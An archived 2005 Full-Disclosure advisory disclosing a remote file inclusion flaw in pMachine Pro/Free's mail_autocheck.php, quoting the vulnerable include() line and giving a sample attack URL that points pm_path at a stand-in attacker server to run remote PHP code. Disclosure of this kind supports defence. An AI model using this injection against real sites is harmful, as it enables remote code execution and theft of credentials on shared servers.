=== Content from marc.info_cfe38dc0_20250125_160222.html ===

```
[[prev in list](?l=full-disclosure&m=110883285128684&w=2)] [[next in list](?l=full-disclosure&m=110884344018437&w=2)] [prev in thread] [next in thread]
List:       [full-disclosure](?l=full-disclosure&r=1&w=2)
Subject:    [Full-Disclosure] pMachine Pro / pMachine Free Remote Code Execution
From:       ["kc" <kingcope () gmx ! net>](?a=110883622700001&r=1&w=2)
Date:       [2005-02-19 16:58:25](?l=full-disclosure&r=1&w=2&b=200502)
Message-ID: [200502191658.j1JGwKrs010686 () lists ! netsys ! com](?i=200502191658.j1JGwKrs010686%20()%20lists%20!%20netsys%20!%20com)
[Download RAW [message](?l=full-disclosure&m=110883604531802&q=mbox) or [body](?l=full-disclosure&m=110883604531802&q=raw)]

[[Attachment #2 (multipart/alternative)]](?l=full-disclosure&m=110883604531802&q=p2)

pMachine Pro / pMachine Free Remote Code Execution
vendor website: <http://www.pmachine.com>

I. BACKGROUND
PMachine is one of the most flexible & creative on-line publishing
tools available.  With PMachine you can publish any kind of
web content - from a basic weblog to an advanced, interactive magazine.
Easy to use, even for those new to BLOGing!
Even the most inexperienced user can have their weblog up and running
in 10 minutes or less.

II. DESCRIPTION
A remote attacker is able to execute commands with the privileges
of the underlying webserver. Under special circumstances the attacker
is also in place to escalate his privileges and gain full access to the
affected system.

The file containing the vulnerability is placed at

pm/add_ons/mail_this_entry/mail_autocheck.php

from the pMachine root directory. This file contains the following
PHP code:

<?php include($pm_path."mailserver".$sfx); ?>

as no check was done to the user supplied $pm_path variable it
is possible to include a remote php script and take advantage of
this typical PHP include() vulnerability.

Followed is a sample attack to the pMachine hosting server:
<http://targetserver/pMachine/pm/add_ons/mail_this_entry/>
mail_autocheck.php?pm_path=[http://attackers-webserver/malicious-code.php?](http://attackers-webserver/malicious-code.php)

The question mark at the very end of this URL will truncate the
appended "mailserver".$sfx of the vulnerable pMachine code.

III. ANALYSIS

Remote exploitation allows an attacker to execute arbitrary commands
and code under the privileges of the web server. This also opens the
door to privilege escalation attacks.
In junction with other unpatched vulnerabilities (the recent curl issue)
the attacker is able to read any file on the system even without
escalating his privileges.
For example on an shared website server and read out secret account
credentials.

IV. DETECTION
The latest pMachine Pro and pMachine Free release is vulnerable to
the attack described above.

kcope - kingcope[at]gmx.net

[[Attachment #5 (text/html)]](?l=full-disclosure&m=110883604531802&q=p5)

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<HTML><HEAD>
<META http-equiv=Content-Type content="text/html; charset=us-ascii">
<META content="MSHTML 6.00.2900.2604" name=GENERATOR></HEAD>
<BODY>
<DIV><FONT face=Arial size=2>pMachine Pro / pMachine Free Remote Code
Execution<BR>vendor website: <A
href="<http://www.pmachine.com>"><http://www.pmachine.com></A></FONT></DIV>
<DIV>&nbsp;</DIV>
<DIV><FONT face=Arial size=2>I. BACKGROUND<BR>PMachine is one of the most
flexible &amp; creative on-line publishing<BR>tools available.&nbsp; With
PMachine you can publish any kind of<BR>web content - from a basic weblog to an
advanced, interactive magazine.<BR>Easy to use, even for those new to
BLOGing!<BR>Even the most inexperienced user can have their weblog up and
running<BR>in 10 minutes or less.</FONT></DIV>
<DIV>&nbsp;</DIV>
<DIV><FONT face=Arial size=2>II. DESCRIPTION<BR>A remote attacker is able to
execute commands with the privileges<BR>of the underlying webserver. Under
special circumstances the attacker<BR>is also in place to escalate his
privileges and gain full access to the<BR>affected system.</FONT></DIV>
<DIV>&nbsp;</DIV>
<DIV><FONT face=Arial size=2>The file containing the vulnerability is placed
at</FONT></DIV>
<DIV>&nbsp;</DIV>
<DIV><FONT face=Arial
size=2>pm/add_ons/mail_this_entry/mail_autocheck.php</FONT></DIV>
<DIV>&nbsp;</DIV>
<DIV><FONT face=Arial size=2>from the pMachine root directory. This file
contains the following<BR>PHP code:</FONT></DIV>
<DIV>&nbsp;</DIV>
<DIV><FONT face=Arial size=2>&lt;?php include($pm_path."mailserver".$sfx);
?&gt;</FONT></DIV>
<DIV>&nbsp;</DIV>
<DIV><FONT face=Arial size=2>as no check was done to the user supplied $pm_path
variable it<BR>is possible to include a remote php script and take advantage
of<BR>this typical PHP include() vulnerability.</FONT></DIV>
<DIV>&nbsp;</DIV>
<DIV><FONT face=Arial size=2>Followed is a sample attack to the pMachine hosting
server:<BR><A
href="<http://targetserver/pMachine/pm/add_ons/mail_this_entry/>"><http://targetserver/pM> \
achine/pm/add_ons/mail_this_entry/</A><BR>mail_autocheck.php?pm_path=[http://attackers-webserver/malicious-code.php?](http://attackers-webserver/malicious-code.php)</FONT></DIV>
 <DIV>&nbsp;</DIV>
<DIV><FONT face=Arial size=2>The question mark at the very&nbsp;<SPAN
class=730425616-19022005>e</SPAN>nd of this URL will truncate the<BR>appended
"mailserver".$sfx of the vulnerable pMachine code.</FONT></DIV>
<DIV>&nbsp;</DIV>
<DIV><FONT face=Arial size=2>III. ANALYSIS</FONT></DIV>
<DIV>&nbsp;</DIV>
<DIV><FONT face=Arial size=2>Remote exploitation allows an attacker to execute
arbitrary commands<BR>and code under the privileges of the web server. This also
opens the<BR>door to privilege escalation attacks.<BR>In junction with other
unpatched vulnerabilities (the recent curl issue)<BR>the attacker is able to
read any file on the system even without<BR>escalating his privileges.<BR>For
example on an shared website server and read out secret
account<BR>credentials.</FONT></DIV>
<DIV>&nbsp;</DIV>
<DIV><FONT face=Arial size=2>IV. DETECTION<BR>The latest pMachine Pro and
pMachine Free release is vulnerable to<BR>the attack described
above.</FONT></DIV>
<DIV>&nbsp;</DIV>
<DIV><FONT face=Arial size=2>kcope - kingcope[at]gmx.net</FONT></DIV>
<DIV><FONT face=Arial size=2></FONT>&nbsp;</DIV></BODY></HTML>

_______________________________________________
Full-Disclosure - We believe in it.
Charter: <http://lists.netsys.com/full-disclosure-charter.html>

[[prev in list](?l=full-disclosure&m=110883285128684&w=2)] [[next in list](?l=full-disclosure&m=110884344018437&w=2)] [prev in thread] [next in thread]

```

[Configure](?q=configure) |
[About](?q=about) |
[News](?q=news) |
Add a list |
Sponsored by [KoreLogic](http://www.korelogic.com/)


